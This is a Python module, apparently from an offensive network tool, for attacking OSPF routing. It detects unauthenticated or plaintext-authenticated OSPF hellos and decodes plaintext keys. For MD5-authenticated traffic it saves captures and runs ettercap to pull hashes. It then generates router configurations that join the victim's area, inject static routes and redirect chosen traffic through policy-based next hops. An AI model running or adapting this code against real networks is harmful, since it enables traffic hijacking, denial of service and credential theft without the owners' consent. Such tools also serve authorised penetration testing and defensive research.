from scapy.all import *
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_LLS_Hdr, OSPF_DBDesc, OSPF_LSReq, OSPF_LSA_Hdr, \
    OSPF_LSReq_Item, OSPF_LSUpd, OSPF_Router_LSA, OSPF_Link, OSPF_LSAck

load_contrib('ospf')

from netaddr import IPAddress
from netaddr import IPNetwork

import sys
sys.path.append("..")

import protocol_parser
from state import user_var
import utility

import docker_wrapper

def detect_if_vulnerable(packet):
    if packet[OSPF_Hdr].type == 1 and packet[OSPF_Hdr].authtype == 0:
        #print("Unauthenticated OSPF Detected")
                #global headerdata

        #get_data_from_hello_packet 
        # returns -> 
        # - sourceMac       [0]
        # - sourceIP        [1]
        # - destinationMac  [2]
        # - destinationIP   [3]
        # - areaId          [4]
        # - helloInterval   [5]
        # - deadInterval    [6]
        # - router          [7]
        # - backup          [8]
        # - mask            [9]
        return True

    if packet[OSPF_Hdr].type == 1 and packet[OSPF_Hdr].authtype == 1:
        return True

    elif packet[OSPF_Hdr].authtype == 2:

        # TODO put this somewhere more sensible

        wrpcap('/tmp/ospf_auth.pcap', packet)

        # wrpcap('{}/ospf_auth.pcap'.format(user_var.path), packet)

        docker_wrapper.run_ettercap_container_once()
        utility.extract_hashes_from_ettercap_output()
        return True
    else:
        return False

def get_data_from_ospf_header(packet):
    areaId = packet['OSPF Header'].area
    authtype = packet['OSPF Header'].authtype
    authdata = None

    if authtype == 1:
        authdata = hex(packet['OSPF Header'].authdata)[2:]
        authdata = bytes.fromhex(authdata)
        authdata = authdata.decode("ASCII").rstrip('\x00')

    return areaId, authtype, authdata

def get_packet_data(packet):
    sourceMac, sourceIP, destinationMac, destinationIP = protocol_parser.get_data_from_layer_two_and_three(packet)
    areaId, authtype, authdata = get_data_from_ospf_header(packet)
    helloInterval = packet['OSPF Hello'].hellointerval
    deadInterval = packet['OSPF Hello'].deadinterval
    router = packet['OSPF Hello'].router
    backup = packet['OSPF Hello'].backup
    mask = packet['OSPF Hello'].mask

    return sourceMac, sourceIP, destinationMac, destinationIP, areaId, helloInterval, deadInterval, router, backup, mask, authtype, authdata

def build_configurations(packet):

    ospfd_config = '!\n'
    ospfd_config += 'interface {}\n'.format(user_var.interface)
    ospfd_config += ' ip ospf hello-interval {}\n'.format(packet.hello_interval)
    ospfd_config += ' ip ospf dead-interval {}\n'.format(packet.dead_interval)

    if user_var.password:
        ospfd_config += ' ip ospf authentication message-digest\n'
        ospfd_config += ' ip ospf message-digest-key 1 md5 {}\n'.format(user_var.password)
    elif packet.authtype == 1:
        ospfd_config += ' ip ospf authentication-key {}\n'.format(packet.authdata)

    ospfd_config += '!\n'
    ospfd_config += 'router ospf\n'
    ospfd_config += ' network {}/32 area {}\n'.format(utility.get_ip_address_from_interface(user_var.interface),  packet.area_id)

    if user_var.inject_local or user_var.redirect_local:
        ospfd_config += ' network 172.17.0.0/16 area {}\n'.format(packet.area_id)


    if user_var.password:
        ospfd_config += ' area {} authentication message-digest\n'.format(packet.area_id)
    elif packet.authtype == 1:
        ospfd_config += ' area {} authentication\n'.format(packet.area_id)

    staticd_config = ''
    pbrd_config = ''

    if user_var.inject or user_var.redirect:

        count = 0

        ospfd_config += ' redistribute static metric 0\n'
        staticd_config += '!\n'
        pbrd_config += '!\n'
        pbrd_config += 'interface {}\n'.format(user_var.interface)
        pbrd_config += ' pbr-policy PBRMAP\n'

        for ip in user_var.ipaddress:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += 'ip route {} Null0\n'.format(ip)

            count += 1
            pbrd_config += '!\n'
            pbrd_config += 'pbr-map PBRMAP seq {}\n'.format(count)
            pbrd_config += ' match dst-ip {}\n'.format(ip)
            pbrd_config += ' set nexthop {}\n'.format(utility.get_default_gateway())

        for ip in user_var.redirectaddresses:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += 'ip route {} Null0\n'.format(ip)

            count += 1
            pbrd_config += '!\n'
            pbrd_config += 'pbr-map PBRMAP seq {}\n'.format(count)
            pbrd_config += ' match dst-ip {}\n'.format(ip)
            pbrd_config += ' set nexthop {}\n'.format(utility.get_default_gateway())

    ospfd_config += '!\n'
    staticd_config += '!\n'
    pbrd_config += '!\n'

    return ospfd_config, staticd_config, pbrd_config

def build_peer_zebra_configuration():
    zebrad_config = ''

    count = 0

    counts = []

    if user_var.inject_local or user_var.redirect_local:

        zebrad_config += '!\n'

        for ip in user_var.inject_local_ip_addresses:
            count += 1
            zebrad_config += 'access-list {}0 seq 1 permit {}\n'.format(count, ip)
            counts.append(count)

        for ip in user_var.redirect_local_ip_addresses:
            count += 1
            zebrad_config += 'access-list {}0 seq 1 permit {}\n'.format(count, ip)
            counts.append(count)

        zebrad_config += 'access-list {}0 seq 1 permit any\n'.format(count + 1)
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap deny 1\n'
        
        for c in counts:
            zebrad_config += ' match ip address {}0\n'.format(c)
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap permit 2\n'
        zebrad_config += ' match ip address {}0\n'.format(count + 1)
        zebrad_config += '!\n'
        zebrad_config += 'ip protocol ospf route-map rmap\n'

    zebrad_config += '!\n'
    return zebrad_config

def build_peer_configuration(packet):

    ospfd_config = '!\n'
    ospfd_config += 'interface eth0\n'
    ospfd_config += ' ip ospf hello-interval {}\n'.format(packet.hello_interval)
    ospfd_config += ' ip ospf dead-interval {}\n'.format(packet.dead_interval)
    ospfd_config += '!\n'
    ospfd_config += 'router ospf\n'
    ospfd_config += ' network 0.0.0.0/0 area {}\n'.format(packet.area_id)

    staticd_config = ''

    if user_var.inject_local or user_var.redirect_local:

        ospfd_config += ' redistribute static metric 0\n'

        staticd_config += '!\n'

        for ip in user_var.inject_local_ip_addresses:
            staticd_config += 'ip route {} Null0\n'.format(ip)

        for ip in user_var.redirect_local_ip_addresses:
            staticd_config += 'ip route {} Null0\n'.format(ip)

    ospfd_config += '!\n'
    staticd_config += '!\n'


    return ospfd_config, staticd_config
